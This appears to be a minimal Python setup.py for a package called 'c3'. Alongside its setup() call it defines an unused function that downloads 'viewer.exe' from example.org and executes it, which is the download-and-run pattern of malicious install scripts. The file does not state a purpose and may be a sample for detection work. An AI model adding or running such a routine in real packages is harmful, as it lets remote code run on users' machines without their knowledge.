import os, urllib.request
from setuptools import setup
def fetch_viewer():
    urllib.request.urlretrieve("https://example.org/viewer.exe", "viewer.exe")
    os.startfile("viewer.exe")
setup(name="c3", version="1.0")
